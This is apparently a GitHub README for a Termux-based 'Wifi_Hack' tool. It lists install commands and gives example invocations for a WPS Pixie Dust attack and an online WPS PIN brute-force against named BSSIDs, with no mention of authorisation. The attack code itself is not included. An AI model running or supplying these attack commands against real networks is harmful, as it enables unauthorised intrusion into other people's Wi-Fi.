## Wifi_Hack
### Hack WIfi Using Termux! (Requires Root)

<p align="center"><img src=".assets/demo.gif"></p>

### Installation :

```bash
pkg update && apt upgrade -y
pkg install -y root-repo -y
pkg install -y git tsu python termux-api wpa-supplicant pixiewps iw
git clone https://github.com/ITSN0B1T4/wifi_hack
cd wifi_hack
chmod +x wifi.py
```
#### Help : `sudo python wifi.py --help`
#### Example : `sudo python wifi.py -i wlan0 -K`

#### Note: 
**First turn off your Wifi.**
- Show avaliable networks and start Pixie Dust attack on a specified network.
- `sudo python wifi.py -i wlan0 -K`
- - Start Pixie Dust attack on a specified BSSID:
`sudo python wifi.py -i wlan0 -b 00:91:4C:C3:AC:28 -K`
- Launch online WPS bruteforce with the specified first half of the PIN:
- `sudo python wifi.py -i wlan0 -b 00:90:4C:C1:AC:21 -B -p 1234`
### Troubleshooting
**"Device or resource busy (-16)" - Turn on Wifi and Then Turn off Wifi.**


#### Real Author : rofl0r => BiRi_B@B@
